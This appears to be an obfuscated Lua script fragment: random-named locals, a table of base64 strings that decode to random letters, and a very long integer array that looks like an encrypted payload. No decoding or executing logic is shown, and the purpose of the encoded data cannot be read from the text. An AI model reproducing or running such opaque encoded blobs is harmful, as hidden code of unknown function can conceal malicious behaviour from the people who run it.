local F5scSn=113
local p3rDEn={"dUVHamRrZA==","WVVaTFRZ","cVBEQ1hYWVBT","Unp4cU8=","Q01YRXlPT0FQVQ==","TmRKcnVBVGk=","ZVhlWk5zbWdOSA==","Z0N5Yg==","R1BGTldiWlJQ","ZWx3QWNXWWk=","Ym5HcE5hVk9O"}
local wSPisu=72710
local A82oMv=2331
local yBD7Yt=56155
local wZvN3g=46592
local XFBLAJ=47140
local FdKTUL={29,31,16,19,25,84,27,31,27,88,70,90,17,19,30,26,18,20,17,11,11,3,79,1,8,5,14,80,37,24,27,30,22,53,39,122,119,60,35,34,41,43,97,117,114,46,62,41,111,39,42,54,45,49,37,51,58,45,57,41,34,34,59,43,95,68,29,81,90,89,24,90,80,93,89,95,79,72,76,70,14,116,76,80,68,9,107,79,75,90,74,88,84,3,66,79,120,126,60,97,103,119,56,122,112,122,105,123,111,101,113,123,118,34,47,34,113,118,114,99,32,33,35,35,7,6,99,97,146,145,159,210,165,152,150,143,156,138,136,218,192,220,152,159,140,133,217,165,128,144,180,131,155,158,130,137,136,196,205,190,189,177,170,183,167,167,245,255,211,180,180,185,188,176,255,140,180,174,144,167,183,178,174,165,172,232,246,234,170,173,162,171,139,247,214,198,230,209,197,192,208,219,222,146,159,238,202,208,242,197,209,212,204,199,194,132,128,162,161,198,194,207,206,194,177,224,255,243,236,241,229,182,164,184,203,246,252,229,250,236,242,174,207,237,230,229,235,214,229,233,242,239,255,134,227,225,18,17,31,82,22,21,26,19,11,25,91,71,93,11,16,12,10,19,19,3,6,1,73,37,28,26,25,15,3,24,44,15,60,53,33,51,95,56,56,53,56,52,123,41,45,57,58,58,4,46,34,32,41,33,35,102,116,104,45,43,33,63,42,68,93,95,80,83,89,20,68,70,92,93,95,108,92,80,74,91,1,29,3,19,19,46,75,73,74,73,71,10,76,89,91,65,89,121,103,87,123,117,117,122,124,124,59,39,61,122,126,114,114,101,9,110,106,103,102,106,41,100,106,121,121,68,102,122,209,205,211,194,255,152,152,149,152,148,219,155,148,145,189,145,133,153,166,140,132,134,139,131,141,200,214,202,139,141,131,157,180,218,191,189,182,181,187,246,184,182,175,179,143,189,184,186,174,172,175,135,171,165,165,170,172,172,235,247,237,170,174,162,194,213,185,222,218,215,214,218,153,212,212,217,214,238,222,218,200,213,208,130,152,132,146,150,163,162,199,197,206,205,195,142,247,229,253,241,225,253,248,248,185,255,254,238,201,243,240,242,207,225,238,231,173,173,141,166,169,168,171,230,226,239,238,226,81,19,27,19,7,21,20,2,28,10,91,71,93,12,19,31,24,5,17,76,38,12,6,20,8,11,31,15,31,102,79,78,113,112,58,52,117,58,56,34,121,59,51,59,47,61,60,42,36,50,99,54,45,33,41,102,59,45,63,63,63,34,111,108,98,71,90,92,82,22,23,83,87,92,49,26,29,28,31,82,78,67,66,78,5,80,72,73,69,8,22,10,78,68,78,92,112,115,103,119,103,46,81,127,119,124,93,115,111,111,107,93,105,105,111,102,74,98,68,106,104,123,120,34,47,88,96,97,157,210,218,248,213,212,215,214,144,158,219,142,146,147,147,222,149,136,134,140,197,150,130,146,156,154,133,202,153,131,128,130,255,158,178,191,176,244,178,184,189,210,251,250,253,252,179,177,162,161,175,226,167,165,164,173,185,169,168,161,237,241,239,190,221,209,202,215,199,154,245,215,218,211,203,219,222,215,181,158,129,128,131,203,195,132,197,199,202,195,219,203,206,199,143,218,249,245,253,152,181,180,183,182,185,184,187,186,241,243,252,255,237,160,247,162,184,164,229,231,234,227,251,235,238,231,181,200,24,30,23,52,28,6,4,2,58,16,18,22,25,51,25,61,13,1,16,17,77,70,51,9,6,4,73,67,103,76,79,78,113,112,115,114,117,61,49,118,45,120,47,50,56,50,127,44,36,52,54,48,43,100,51,104,7,41,38,47,109,41,33,42,59,16,19,18,21,81,89,82,51,24,27,26,29,78,90,74,84,82,77,2,7,119,80,79,71,79,9,32,72,66,75,36,27,124,124,113,116,120,55,112,108,118,120,110,116,115,113,62,102,101,119,76,96,101,117,99,122,124,91,102,108,117,106,124,217,217,249,210,213,212,215,154,150,155,154,150,221,159,151,159,147,129,128,150,128,150,199,219,201,152,135,139,148,137,157,192,146,184,178,160,180,183,163,179,171,210,251,250,253,252,182,184,225,174,172,182,229,167,175,167,187,169,168,190,168,190,239,186,217,213,221,146,199,209,195,195,203,214,155,212,212,208,159,219,207,196,169,130,133,132,135,202,198,203,202,198,141,222,192,193,229,192,242,224,225,180,170,182,250,240,250,232,252,255,235,251,243,186,197,235,235,224,193,239,251,251,255,201,229,229,227,234,89,82,59,7,24,21,25,25,16,28,41,21,18,8,47,31,19,20,65,75,111,68,71,70,73,1,13,74,3,3,27,78,35,63,60,38,5,53,37,34,121,44,51,63,51,124,45,59,53,53,49,44,101,42,46,42,105,45,37,46,71,108,111,110,17,92,92,81,84,88,23,88,92,89,73,95,78,72,31,3,1,78,74,78,47,4,7,6,9,68,68,73,76,64,15,64,116,113,97,119,102,96,83,127,106,108,59,39,61,112,112,125,106,82,98,102,108,113,116,38,35,40,56,36,56,59,62,4,209,208,211,210,147,155,133,214,166,212,219,138,221,149,145,222,136,144,130,139,151,151,207,182,133,137,146,143,159,159,213,169,180,164,131,190,180,173,178,164,170,240,242,243,253,184,176,212,225,224,227,226,229,228,231,230,160,174,235,186,237,178,242,238,193,220,210,203,208,198,151,215,215,220,155,202,147,255,215,223,211,193,192,214,192,214,135,210,193,205,197,160,141,140,143,142,177,176,179,178,181,180,183,182,245,247,248,251,241,188,237,241,238,244,163,191,165,244,169,197,225,233,249,235,238,248,234,252,75,54,26,28,17,50,30,4,10,12,56,18,20,16,27,86,67,40,22,15,4,10,8,15,13,58,4,5,25,60,14,28,37,114,122,88,117,116,119,118,121,120,123,122,125,124,127,126,45,47,32,35,41,100,47,51,36,104,118,106,61,98,12,38,80,66,82,81,65,81,69,12,127,81,85,94,123,85,77,77,85,99,75,75,73,64,15,4,97,93,70,75,67,67,70,74,51,57,25,50,53,52,55,54,57,56,59,58,61,60,63,119,103,32,113,109,106,112,39,103,103,108,43,98,120,97,47,111,159,148,211,154,128,153,217,190,156,153,151,142,149,220,193,222,209,192,151,138,128,138,237,198,201,200,203,202,205,204,207,206,241,240,243,242,245,244,247,186,182,187,186,182,253,184,182,173,181,224,254,226,237,182,168,169,189,230,155,165,190,165,187,167,222,222,147,159,149,198,216,217,205,232,218,200,201,146,239,209,210,201,215,203,202,202,142,136,228,201,204,196,196,216,218,202,244,154,179,178,181,180,183,182,185,184,187,186,189,188,191,190,161,160,234,228,165,224,238,245,253,168,183,170,227,233,238,252,20,3,7,54,28,7,3,86,13,16,30,20,119,92,95,94,65,64,67,66,69,68,71,70,73,72,75,74,77,76,79,78,113,62,54,51,39,49,36,34,29,49,40,46,125,97,127,58,40,51,55,72,101,100,103,102,105,104,107,106,109,108,111,110,17,16,19,18,21,20,23,22,87,93,90,72,88,79,75,30,28,0,83,12,102,76,70,84,72,75,95,79,95,22,105,71,127,116,85,123,103,103,99,85,113,113,119,126,53,62,87,123,96,100,33,43,37,107,117,38,123,103,100,126,7,44,47,46,209,208,211,210,213,212,215,214,217,216,219,218,221,153,145,154,235,192,195,194,197,196,199,198,201,200,203,202,205,137,129,138,219,240,243,242,245,244,247,246,249,189,181,190,215,252,255,254,225,165,173,166,207,228,231,230,233,186,174,190,184,190,161,238,223,213,210,192,208,199,195,188,220,214,223,176,183,208,208,221,192,204,131,196,208,202,196,210,192,199,197,138,204,220,223,194,232,222,252,198,250,225,244,254,177,251,243,251,239,181,149,190,161,160,163,235,227,164,233,233,253,168,234,228,249,229,221,239,22,20,28,30,25,49,25,23,27,20,30,30,93,8,23,27,15,64,17,7,17,17,21,8,73,13,5,14,103,76,79,78,113,60,60,49,52,56,119,62,44,53,58,52,50,53,59,126,124,96,32,42,36,54,125,17,40,33,63,12,34,62,12,38,88,92,87,26,23,124,66,91,88,86,84,83,89,30,19,30,20,9,41,2,5,4,7,79,79,8,69,69,89,12,71,91,124,113,125,125,124,112,55,98,113,125,117,58,111,121,107,107,115,110,35,103,107,96,13,12,41,40,43,42,101,121,98,111,159,159,154,150,207,167,146,130,170,140,154,142,152,185,145,159,131,140,134,134,205,161,137,147,132,198,163,159,128,141,129,129,184,180,128,166,180,160,178,130,160,168,190,244,143,189,184,186,174,172,175,238,229,162,166,170,186,173,226,192,237,236,239,238,217,197,222,211,219,219,222,210,131,235,222,206,238,200,222,202,196,229,205,195,199,200,194,194,129,237,197,223,192,130,231,219,252,241,253,253,252,240,196,226,248,236,254,206,228,236,250,176,199,225,239,238,236,234,224,194,230,255,229,166,173,234,238,226,2,21,90,120,85,84,87,86,17,13,22,27,19,19,22,26,91,51,6,22,54,16,6,18,12,45,5,11,15,0,10,10,121,21,61,39,56,122,31,35,52,57,53,53,52,56,12,42,32,52,38,22,60,52,34,104,25,36,42,62,43,35,61,35,98,68,82,92,81,93,89,81,21,24,93,91,81,79,90,23,43,0,3,2,5,76,82,75,72,70,68,67,73,22,108,70,112,126,116,119,70,96,118,98,124,48,94,116,104,113,49,86,116,109,98,108,106,109,99,85,125,105,127,111,89,117,127,107,223,162,134,156,155,157,153,145,208,242,241,218,221,220,223,152,142,146,195,189,201,196,151,135,155,156,203,131,131,204,159,143,184,162,160,250,182,188,182,164,227,159,190,174,153,185,172,189,164,174,167,163,171,176,180,238,224,225,235,174,162,198,239,238,145,144,147,146,149,148,222,208,153,200,218,200,201,134,246,205,224,136,129,224,196,215,194,246,200,218,223,136,132,140,219,198,244,254,153,178,181,180,183,182,185,184,187,186,189,188,191,238,224,242,247,172,198,229,233,210,230,253,232,226,173,177,175,232,16,28,0,23,127,84,87,86,89,88,91,90,93,25,19,13,4,9,5,66,21,5,21,18,83,33,24,43,69,78,34,1,37,63,33,100,17,118,126,118,54,42,123,42,60,46,43,100,8,51,2,106,103,19,34,42,45,106,98,106,34,62,111,62,80,66,71,8,124,71,118,30,27,122,90,86,81,111,80,93,74,69,87,97,74,74,84,82,91,73,66,68,89,14,6,14,101,120,118,124,31,52,55,54,57,56,59,58,61,60,63,62,33,112,98,112,113,62,64,99,125,88,121,101,125,105,125,122,136,179,155,147,155,147,146,146,170,145,156,148,156,144,215,220,164,142,130,128,137,129,131,196,192,210,168,133,131,130,138,141,165,248,181,167,187,183,163,191,182,182,243,243,215,252,255,254,225,224,227,226,229,228,231,230,233,232,235,234,237,165,169,238,208,222,199,219,231,213,208,210,214,212,215,255,211,221,221,210,196,196,131,195,203,192,135,200,198,220,139,218,204,222,219,128,212,254,242,240,249,241,243,182,237,240,254,244,189,150,191,190,161,160,163,162,165,164,167,166,169,168,171,170,173,172,175,174,81,80,3,19,7,0,89,51,23,25,25,22,24,24,95,67,65,20,17,23,0,68,109,70,73,72,75,74,77,76,79,78,113,112,115,114,117,116,119,51,55,60,81,122,125,124,127,126,97,96,99,98,101,100,103,35,39,44,98,64,109,108,111,110,17,16,19,18,21,20,23,22,73,89,73,78,19,125,81,93,68,83,87,80,92,103,79,71,71,79,78,78,23,111,64,64,127,117,112,102,61,114,98,120,122,108,114,117,115,52,64,50,33,112,98,112,96,106,115,47,3,40,43,42,45,44,47,46,209,208,211,210,213,212,215,214,217,145,157,218,156,146,139,151,179,129,132,134,138,136,139,163,135,137,137,134,136,136,207,143,191,180,243,188,186,160,247,166,184,170,190,180,169,252,190,176,165,224,160,170,164,182,231,167,167,172,235,169,165,173,189,224,225,209,193,215,219,192,151,194,209,221,213,176,157,156,159,158,129,128,131,130,133,132,135,134,137,136,139,138,141,140,143,142,253,255,240,243,249,180,244,250,246,246,254,186,160,188,239,255,243,244,185,193,233,235,233,227,161,161,129,170,173,172,175,174,81,80,83,82,85,84,87,86,89,88,91,90,93,92,95,29,13,15,13,7,75,52,6,20,12,6,31,74,80,76,31,15,35,36,125,2,52,38,50,56,45,82,123,122,125,124,127,126,97,96,99,98,101,100,103,102,105,104,46,36,41,70,111,110,17,16,19,18,21,20,23,22,25,24,94,84,89,21,53,30,1,0,3,2,5,4,7,67,71,76,33,10,13,12,15,75,127,116,25,119,123,112,29,28,105,116,122,99,120,110,49,93,105,97,113,99,102,112,98,116,72,108,111,111,105,54,76,97,159,158,150,145,129,220,145,131,151,155,143,147,146,146,215,157,137,129,145,203,239,196,199,198,201,129,141,202,140,130,155,135,131,177,180,182,186,184,187,147,183,185,185,182,184,184,255,170,169,165,173,200,229,228,231,230,233,232,235,234,172,188,191,162,200,254,220,230,218,193,212,222,145,219,211,219,207,149,181,158,129,128,131,199,203,192,173,195,199,204,130,160,167,192,192,205,240,252,179,229,252,250,218,247,240,246,187,167,189,240,246,252,187,195,241,231,228,240,226,209,224,230,239,229,250,164,173,249,16,30,83,26,0,22,85,95,115,114,12,19,19,49,30,23,15,90,34,6,1,48,8,1,14,4,14,66,22,102,79,78,113,112,39,55,45,32,119,107,121,122,26,52,41,53,114,44,32,39,39,45,41,40,101,106,67,104,107,106,109,42,35,47,86,16,14,18,23,64,88,81,94,84,94,15,31,16,53,30,1,0,3,81,81,69,83,67,9,21,11,76,76,64,92,75,61,26,51,50,53,52,116,119,117,116,121,123,126,119,63,35,33,102,118,108,102,112,110,105,103,32,125,35,7,44,47,46,209,208,211,210,213,149,153,130,144,170,154,157,153,147,147,146,164,142,130,128,137,129,131,198,212,200,157,224,205,204,207,206,241,240,243,242,188,178,247,160,249,185,181,190,253,172,179,191,184,165,177,236,134,172,166,180,168,171,191,175,191,236,187,166,212,222,185,146,149,148,151,150,153,152,155,154,157,156,159,223,209,208,207,219,235,203,243,201,220,203,195,130,221,192,206,215,244,226,189,209,253,245,229,247,250,236,254,232,180,150,191,190,161,160,163,162,165,164,226,234,250,237,226,236,173,226,224,250,81,6,83,19,27,16,87,6,21,25,2,31,15,82,60,22,0,18,2,1,17,1,21,70,29,0,14,4,103,76,79,78,113,112,115,114,117,116,119,118,121,52,52,57,60,48,127,54,52,45,34,44,42,45,35,102,116,104,59,38,44,53,42,60,31,115,91,83,71,85,84,66,92,74,1,124,84,82,91,120,72,82,80,86,102,76,78,74,77,103,77,105,65,77,92,93,57,50,91,103,120,117,121,121,112,124,57,51,23,60,63,62,33,32,35,34,37,36,39,38,41,97,109,42,101,121,98,111,159,159,154,150,213,128,159,147,151,242,219,218,221,220,223,222,193,192,195,194,197,196,199,198,201,200,131,159,128,141,129,129,184,180,233,129,176,160,132,162,184,172,190,159,179,189,189,178,164,164,235,135,171,177,170,232,129,189,166,171,163,163,166,170,226,196,210,198,208,224,206,198,220,150,233,219,218,216,208,210,205,140,131,214,215,209,194,143,163,136,139,138,141,140,143,142,177,176,179,178,181,180,183,182,185,240,238,247,252,242,240,247,229,186,208,231,241,215,243,231,253,237,206,228,236,238,227,235,21,88,54,28,0,25,89,62,12,21,26,20,18,21,27,45,21,1,23,7,49,29,23,3,71,46,10,6,1,5,1,9,21,63,36,60,121,116,35,36,44,61,114,80,125,124,127,126,97,96,99,98,101,100,103,102,105,104,107,106,37,57,34,47,95,95,90,86,15,103,82,66,106,76,90,78,88,121,81,95,67,76,70,70,13,97,73,83,68,6,99,95,64,77,65,65,120,116,64,102,116,96,114,66,96,104,126,52,77,112,126,106,103,111,113,111,86,112,102,104,109,97,101,109,33,44,123,124,132,149,218,248,213,212,215,214,217,216,219,218,221,220,223,222,132,142,135,232,197,196,199,198,201,200,203,202,205,204,207,206,183,191,161,242,138,248,247,166,184,170,175,250,180,178,255,174,160,169,177,177,237,180,171,167,176,173,185,228,142,164,174,188,208,211,199,215,199,142,240,211,205,252,222,201,222,217,209,218,192,206,215,209,141,141,142,134,205,199,161,138,141,140,143,142,177,176,179,178,181,180,183,182,185,184,187,243,251,188,239,255,243,244,185,203,246,197,175,164,203,233,248,239,221,237,253,250,83,89,83,6,29,17,25,124,89,88,91,90,93,92,95,94,65,64,67,66,69,68,71,70,73,72,75,74,29,13,29,26,127,19,50,60,1,59,34,53,49,120,102,122,41,46,42,59,75,96,99,98,101,100,103,102,105,104,107,106,109,108,111,110,17,85,93,86,63,20,23,22,25,24,27,26,29,28,31,30,1,69,77,70,47,4,7,6,9,8,11,10,13,73,65,74,27,48,51,50,53,113,121,114,19,101,50,16,23,107,118,112,76,97,106,108,63,69,99,98,93,103,108,109,97,105,39,117,251,208,211,210,213,128,146,142,141,216,198,218,223,189,138,138,142,192,171,139,145,198,203,236,201,200,203,202,139,128,142,137,241,237,243,240,161,187,176,177,181,189,233,248,241,214,255,254,225,224,176,182,164,176,162,230,244,232,173,171,161,191,170,226,187,144,147,146,149,215,214,218,213,218,218,217,214,156,130,158,199,213,205,193,209,205,200,200,129,222,130,160,141,140,143,142,177,176,179,178,244,225,227,249,209,241,239,223,243,253,253,242,228,228,163,191,165,242,141,166,169,168,171,239,227,232,133,243,88,122,121,5,28,26,58,23,16,22,65,59,25,24,43,17,6,7,15,7,77,31,109,70,73,72,75,30,8,20,27,78,108,112,113,19,60,57,59,57,58,51,121,118,87,124,127,126,97,38,47,35,34,100,122,102,107,60,36,45,42,32,42,122,19,28,57,18,21,20,23,69,77,89,79,95,29,1,31,88,64,76,80,71,9,46,7,6,9,8,72,75,65,64,77,79,114,123,51,47,53,114,98,120,122,108,114,117,115,52,105,55,11,32,35,34,37,36,39,38,41,105,98,103,79,99,107,119,180,158,146,144,153,145,147,214,196,216,141,240,221,220,223,222,132,142,135,232,152,205,237,236,158,129,133,167,140,133,129,212,144,180,183,134,186,179,176,186,188,240,160,208,253,252,255,254,181,165,187,182,229,249,231,228,154,184,174,175,169,238,227,196,145,144,147,146,211,216,214,209,153,133,155,152,201,211,216,217,205,197,146,128,137,174,135,134,137,136,216,222,204,216,202,142,172,176,245,243,249,231,242,186,147,184,187,186,189,255,254,242,237,226,226,225,238,164,186,166,239,253,229,233,249,229,224,224,89,6,90,120,85,84,87,86,89,88,91,90,14,12,26,27,5,37,13,3,7,8,2,2,73,85,75,28,103,76,79,78,113,112,115,114,117,61,49,118,55,55,47,122,43,124,43,54,36,46,73,98,101,100,103,102,105,104,107,106,109,108,111,34,94,83,82,94,21,87,95,87,75,89,88,78,88,78,31,3,1,80,79,67,92,65,85,8,106,64,74,88,76,79,91,75,99,26,51,50,53,52,55,54,57,56,59,58,61,60,118,120,33,110,108,118,37,103,111,103,123,105,104,126,104,126,47,122,153,149,157,210,135,145,131,131,139,150,219,159,147,152,245,222,193,192,195,194,197,196,199,198,201,200,203,134,130,143,142,130,241,162,188,189,161,132,182,164,173,248,230,250,190,180,190,172,160,163,183,167,183,254,129,175,167,172,141,163,191,191,187,141,217,217,223,214,157,150,255,195,212,217,213,213,212,216,237,209,206,212,243,195,215,208,133,143,163,136,139,138,141,140,143,142,177,176,179,178,181,253,241,182,247,247,239,186,239,243,240,234,209,225,241,246,165,240,239,227,231,168,249,239,249,249,253,224,81,21,29,22,127,84,87,86,89,88,91,90,93,92,95,94,65,12,12,1,4,8,71,16,12,4,75,87,77,30,0,1,37,0,50,32,33,110,17,63,55,60,29,51,47,47,43,29,41,41,47,38,109,102,20,54,44,45,47,28,40,32,32,45,88,68,74,16,28,62,23,22,25,24,27,26,29,28,31,30,1,0,74,68,5,82,66,74,9,92,67,79,67,12,89,75,125,42,87,119,102,96,101,121,96,48,50,58,120,114,123,20,33,32,35,34,37,36,39,38,108,102,111,0,45,44,47,46,148,158,151,248,136,221,253,252,142,145,149,183,156,149,145,196,160,132,135,177,137,141,131,131,155,192,144,224,205,204,207,206,165,181,171,166,245,233,247,244,138,168,190,191,185,254,243,212,225,224,227,226,163,168,166,161,233,245,235,232,190,160,166,170,212,194,130,144,153,190,151,150,153,152,205,219,209,201,218,158,156,128,146,148,137,174,135,134,137,136,198,195,195,140,146,142,161,188,153,178,181,180,183,251,248,224,187,167,189,175,175,174,173,138,163,162,165,164,228,231,229,228,233,235,238,231,175,179,81,22,6,28,22,0,30,25,23,80,13,83,119,92,95,94,65,64,67,66,69,23,23,3,12,12,61,11,1,25,10,78,108,112,37,88,117,116,119,118,60,54,63,80,32,117,85,84,19,53,45,17,32,54,49,47,42,45,101,2,40,45,61,58,83,85,82,70,15,119,88,88,87,93,88,78,21,90,74,80,66,84,74,77,75,12,14,44,9,8,11,10,65,67,76,79,125,48,112,122,116,102,118,117,109,125,105,58,32,60,111,114,96,121,102,112,43,71,111,103,123,105,104,126,104,126,5,46,209,208,211,155,147,212,153,153,141,216,152,146,156,142,158,157,149,133,145,194,145,140,130,136,201,154,142,158,152,158,129,206,180,190,183,216,245,244,247,246,181,183,184,187,177,252,173,177,174,180,147,163,183,176,231,251,233,171,163,171,191,173,172,186,212,194,137,244,220,218,211,240,208,202,200,206,254,212,214,210,197,136,129,234,208,201,198,200,198,193,207,248,194,195,219,254,240,226,231,176,188,158,183,182,185,184,247,245,254,253,243,190,233,245,238,227,235,235,238,226,169,181,171,233,229,237,253,239,18,4,22,0,79,50,30,24,29,62,18,8,14,8,60,22,8,12,7,74,71,44,18,11,8,6,4,3,9,78,70,100,113,112,115,114,60,50,119,56,54,44,123,40,50,51,43,14,32,50,55,98,42,54,103,40,38,60,107,34,56,33,46,32,94,89,87,18,65,92,82,88,25,74,94,78,72,78,81,30,68,78,71,40,47,4,7,6,9,65,77,10,76,66,91,71,67,113,116,118,122,120,123,83,119,121,121,118,120,120,63,106,105,101,109,8,37,36,39,38,41,40,43,42,97,99,108,111,157,208,128,134,148,128,146,214,196,216,147,143,144,157,145,145,136,132,217,165,128,144,180,146,136,156,142,194,196,230,207,206,241,240,243,242,245,244,190,176,249,171,175,187,169,185,255,227,252,224,134,172,176,169,233,142,188,165,170,164,162,165,171,157,197,209,199,215,225,205,199,211,151,234,218,221,217,211,211,210,129,207,209,130,214,208,198,210,204,136,150,151,141,233,193,219,252,190,219,231,248,245,249,249,240,252,200,238,252,232,250,202,248,240,230,172,195,229,235,234,224,230,236,206,226,251,225,174,30,2,83,1,1,21,3,19,89,69,70,90,56,18,10,19,79,40,22,15,4,10,8,15,13,59,31,11,25,9,59,23,33,53,125,2,61,45,36,63,58,43,123,46,53,57,49,84,97,96,99,98,101,100,103,102,105,104,107,106,37,57,34,47,95,95,90,86,15,119,95,87,87,95,94,105,73,93,75,91,9,101,77,87,72,10,111,83,68,73,69,69,68,72,124,90,112,100,118,70,108,100,114,56,75,109,117,116,116,114,120,55,11,32,35,34,37,36,39,38,41,109,101,110,7,44,47,46,209,208,211,210,213,254,215,214,217,216,219,218,221,220,153,145,147,192,188,206,197,148,134,148,157,200,130,132,205,156,142,135,163,163,251,177,189,181,165,183,186,172,190,168,231,155,186,170,133,165,176,161,160,170,163,167,167,188,184,226,228,229,239,170,222,186,147,146,149,148,151,150,153,152,155,154,157,156,214,216,129,208,194,208,209,158,238,213,232,128,137,232,204,223,202,254,240,226,231,176,188,180,246,248,253,184,235,251,239,232,177,221,224,238,215,237,240,231,239,166,253,224,238,228,135,172,175,174,81,80,83,82,85,84,87,86,89,88,91,90,93,12,30,12,21,78,32,3,11,48,8,19,10,0,75,87,77,10,14,2,34,53,89,114,117,116,119,118,121,120,123,122,125,124,127,59,45,51,38,43,35,100,55,39,59,60,113,3,62,13,103,108,124,95,71,93,71,2,115,20,16,24,84,72,29,76,94,76,85,26,106,81,100,12,5,113,76,68,79,8,4,12,64,92,49,96,114,96,97,46,94,101,88,48,57,88,124,112,115,77,110,99,104,103,113,71,104,104,122,124,121,107,100,98,123,44,216,208,135,154,144,154,253,214,217,216,219,218,221,220,223,222,193,192,195,194,197,196,199,143,143,200,133,133,153,204,159,143,163,164,253,151,187,181,181,186,188,188,251,174,181,185,177,254,177,161,177,182,235,129,169,167,171,164,174,174,237,241,239,186,195,197,214,146,208,218,211,188,153,152,155,154,157,156,159,158,129,128,131,130,192,202,195,172,137,136,139,138,141,140,143,142,244,254,247,152,159,180,183,182,185,184,187,186,189,240,240,253,224,236,163,238,234,235,236,194,224,250,238,233,249,229,224,224,81,77,83,0,26,27,3,38,24,10,15,84,62,58,13,31,12,5,77,46,10,11,12,48,12,11,31,5,31,102,79,78,113,112,115,114,117,116,59,57,58,57,55,122,49,51,48,53,0,52,99,127,101,18,34,37,61,39,57,121,99,34,42,57,25,66,92,93,65,100,86,68,77,22,107,85,78,85,75,87,78,78,13,122,5,15,7,74,70,71,64,110,68,94,74,77,101,121,124,124,59,76,59,54,107,119,116,110,77,125,109,106,47,80,108,113,108,112,110,105,103,38,82,38,45,126,96,97,133,160,146,128,129,218,167,153,138,145,143,147,146,146,209,164,193,203,195,142,138,139,140,162,128,154,142,137,153,133,128,128,255,138,250,216,245,244,247,246,249,248,251,250,175,179,176,170,145,161,177,182,235,135,129,180,168,165,174,234,240,236,140,136,195,209,222,215,155,218,210,193,145,202,212,213,201,236,222,204,213,142,243,205,214,205,211,207,198,198,135,138,193,195,192,197,208,228,186,152,181,180,183,182,185,184,187,186,151,188,191,190,161,160,163,162,165,237,225,166,251,231,228,254,221,237,253,250,95,38,22,30,26,23,30,2,0,86,34,90,65,92,82,75,81,64,23,10,0,10,109,70,73,72,75,74,77,76,79,78,113,112,115,32,58,59,35,6,56,42,47,116,11,57,51,49,34,41,55,59,101,121,103,16,44,43,63,37,63,127,97,32,84,71,27,64,90,91,67,102,88,74,79,20,107,89,83,81,66,73,87,91,11,124,11,6,25,4,11,88,66,67,91,126,112,98,103,60,67,113,123,121,122,113,111,99,51,70,54,20,33,32,35,34,37,36,39,38,108,102,111,0,45,44,47,46,148,158,151,248,255,212,215,214,217,145,157,218,142,140,154,155,133,165,141,131,135,136,130,130,201,156,131,143,131,230,207,206,241,240,243,242,245,244,187,185,186,185,183,250,176,179,169,187,133,169,177,226,248,228,175,179,164,169,165,165,164,168,225,131,222,198,214,246,220,198,210,213,205,209,212,212,183,156,159,158,129,128,131,130,133,205,193,134,196,199,221,207,233,197,221,128,220,241,244,252,252,224,226,242,252,184,165,186,173,188,235,246,228,238,137,162,165,164,167,166,169,168,171,170,173,172,175,226,30,19,18,30,85,2,18,26,89,69,91,8,18,19,11,46,0,18,23,88,35,13,9,2,47,1,25,25,25,47,7,7,61,52,123,112,6,36,50,51,61,14,62,54,50,63,54,42,56,98,106,72,101,100,103,102,105,104,107,106,109,108,111,110,88,86,19,92,90,64,23,64,92,84,27,78,85,89,81,52,1,0,3,2,5,4,7,6,9,8,11,10,13,12,15,14,103,117,127,50,40,52,94,120,106,108,122,116,126,121,49,112,100,119,43,32,71,107,99,127,95,109,103,101,110,101,123,119,211,217,249,210,213,212,215,214,217,216,219,218,221,220,223,222,193,192,195,148,128,136,201,168,136,133,142,202,208,204,205,189,161,181,182,182,131,177,187,185,186,177,175,163,255,214,255,254,225,224,227,226,229,228,231,230,233,232,235,234,237,236,185,171,221,158,254,211,205,242,216,196,218,221,155,135,157,234,218,221,213,207,209,145,139,202,194,209,129,153,206,159,129,140,159,130,177,161,246,167,188,158,183,182,185,184,187,186,189,188,191,190,161,160,163,162,165,164,241,227,229,166,219,235,255,233,225,250,81,77,83,0,26,27,3,38,24,10,15,112,93,92,95,94,65,64,67,66,69,68,71,70,12,6,15,96,77,76,79,78,113,112,115,114,117,116,119,118,47,61,55,116,11,57,51,49,34,41,55,59,101,121,103,43,38,62,46,14,36,62,111,100,17,67,67,87,80,80,97,87,85,77,94,48,29,28,31,30,1,0,3,2,64,72,84,67,35,8,11,10,13,12,15,14,49,48,51,50,53,120,120,117,120,116,59,108,120,112,63,35,33,114,108,109,113,84,102,116,125,50,77,99,99,104,73,103,131,131,135,177,157,157,155,146,209,218,168,138,152,153,155,168,132,140,140,129,140,144,158,196,192,226,203,202,205,204,207,206,241,240,243,242,245,244,190,176,249,174,190,182,253,168,183,187,175,224,181,167,169,254,131,163,186,188,185,165,180,228,230,238,212,222,215,184,149,148,151,150,153,152,155,154,216,210,219,180,129,128,131,130,192,202,195,172,163,136,139,138,141,197,201,142,240,249,254,208,250,240,238,211,247,249,249,246,248,248,191,234,233,229,237,136,165,164,167,166,169,168,171,170,225,227,236,239,29,80,7,19,7,19,18,2,89,69,91,29,24,8,49,27,0,18,6,17,17,52,11,7,16,13,25,66,68,102,79,78,113,112,115,114,117,116,62,48,121,44,58,40,58,57,43,126,53,40,38,44,79,100,103,102,105,104,107,106,109,108,111,110,17,92,92,81,84,88,23,69,77,89,79,95,29,1,31,86,84,77,66,76,74,77,67,28,110,77,95,121,89,77,91,75,57,57,25,50,53,52,55,54,57,56,59,58,61,60,63,119,103,32,112,118,100,112,98,38,119,53,43,79,99,121,98,32,185,133,158,147,155,155,158,146,170,140,154,142,152,168,134,142,132,206,177,131,130,128,136,138,133,200,138,132,137,204,156,154,176,164,182,242,171,233,247,147,183,173,182,244,149,169,178,191,175,175,170,166,150,176,166,178,172,156,178,186,168,226,137,175,221,220,218,220,210,240,216,193,215,152,218,212,217,156,204,202,192,212,198,130,219,153,135,227,199,221,198,132,229,217,194,207,255,255,250,246,198,224,246,226,252,204,226,234,248,178,207,246,248,243,234,225,246,164,243,238,236,230,129,170,173,172,175,174,81,80,83,82,85,84,87,86,89,88,91,22,18,31,30,18,65,12,12,13,14,37,19,70,84,72,61,15,14,24,0,28,98,126,61,55,34,124,35,55,43,63,62,46,115,12,48,45,40,52,42,45,43,106,31,106,105,58,36,37,57,28,46,60,69,30,99,93,70,93,67,95,86,86,21,99,17,28,75,95,83,71,70,86,11,116,72,85,64,92,66,69,67,2,117,7,27,48,51,50,53,52,55,54,57,56,59,58,61,60,63,62,33,114,108,109,113,84,102,116,125,38,72,76,127,109,98,107,209,205,211,177,179,134,150,155,156,214,149,159,138,212,141,145,142,148,179,131,151,144,201,182,134,155,130,158,132,131,129,194,241,188,188,189,190,149,163,255,211,248,251,250,253,252,255,254,225,224,227,226,229,161,169,162,195,232,235,234,237,236,239,238,145,213,221,214,191,148,151,150,153,221,213,222,183,182,159,158,129,128,202,196,133,197,210,210,198,224,194,222